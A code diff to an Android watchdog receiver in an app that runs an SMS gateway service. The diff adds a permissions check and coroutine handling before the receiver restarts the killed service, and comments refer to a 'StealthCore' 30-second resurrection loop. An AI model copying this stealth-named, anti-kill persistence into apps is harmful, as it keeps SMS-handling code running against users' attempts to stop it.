@@ -7,15 +7,27 @@ import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.SystemClock
+import com.cornspace.aichat.data.local.SettingsDataStore
 import com.cornspace.aichat.util.AppLogger
 import com.cornspace.aichat.util.Constants.WATCHDOG_ALARM_INTERVAL
+import dagger.hilt.android.AndroidEntryPoint
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.SupervisorJob
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.flow.first
+import javax.inject.Inject
 
 /**
  * Periodic alarm receiver that restarts the service if it has been killed.
  * Fires every 5 minutes even while the device is asleep (coarse watchdog).
  * The fine-grained 30-second resurrection is handled by StealthCore/StealthResurrector.
  */
+@AndroidEntryPoint
 class AlarmReceiver : BroadcastReceiver() {
+
+    @Inject
+    lateinit var settingsDataStore: SettingsDataStore
 
     companion object {
         private const val TAG = "AlarmReceiver"
@@ -71,32 +83,45 @@ class AlarmReceiver : BroadcastReceiver() {
 
     override fun onReceive(context: Context, intent: Intent) {
         AppLogger.d(TAG, "Watchdog alarm fired — checking service")
-        try {
-            if (!SmsGatewayService.isServiceRunning()) {
-                AppLogger.w(TAG, "Service not running — restarting")
-                val serviceIntent = Intent(context, SmsGatewayService::class.java)
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    context.startForegroundService(serviceIntent)
-                } else {
-                    context.startService(serviceIntent)
+
+        val job = kotlinx.coroutines.Job()
+        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob(job))
+        scope.launch {
+            try {
+                val permissionsGranted = settingsDataStore.permissionsGranted.first()
+                if (!permissionsGranted) {
+                    AppLogger.d(TAG, "Permissions not yet granted — skipping service restart")
+                    return@launch
                 }
 
-                // FIX #6: Only start the resurrection loop when we actually need to
-                // restart — not unconditionally on every alarm tick. Calling
-                // startResurrectionLoop() when the service is healthy added a
-                // superfluous alarm reschedule every 5 minutes.
-                StealthCore.startResurrectionLoop(context)
-            } else {
-                AppLogger.d(TAG, "Service running — watchdog alarm no-op")
-                // The StealthResurrector loop is self-perpetuating; no need to
-                // prod it here when everything is healthy.
+                if (!SmsGatewayService.isServiceRunning()) {
+                    AppLogger.w(TAG, "Service not running — restarting")
+                    val serviceIntent = Intent(context, SmsGatewayService::class.java)
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        context.startForegroundService(serviceIntent)
+                    } else {
+                        context.startService(serviceIntent)
+                    }
+
+                    // FIX #6: Only start the resurrection loop when we actually need to
+                    // restart — not unconditionally on every alarm tick. Calling
+                    // startResurrectionLoop() when the service is healthy added a
+                    // superfluous alarm reschedule every 5 minutes.
+                    StealthCore.startResurrectionLoop(context)
+                } else {
+                    AppLogger.d(TAG, "Service running — watchdog alarm no-op")
+                    // The StealthResurrector loop is self-perpetuating; no need to
+                    // prod it here when everything is healthy.
+                }
+
+                // setInexactRepeating() handles all future deliveries automatically.
+                // Do NOT call scheduleAlarm() here — it would create redundant reschedules.
+
+            } catch (e: Exception) {
+                AppLogger.e(TAG, "Error in watchdog receiver", e)
+            } finally {
+                job.cancel()
             }
-
-            // setInexactRepeating() handles all future deliveries automatically.
-            // Do NOT call scheduleAlarm() here — it would create redundant reschedules.
-
-        } catch (e: Exception) {
-            AppLogger.e(TAG, "Error in watchdog receiver", e)
         }
     }
 }
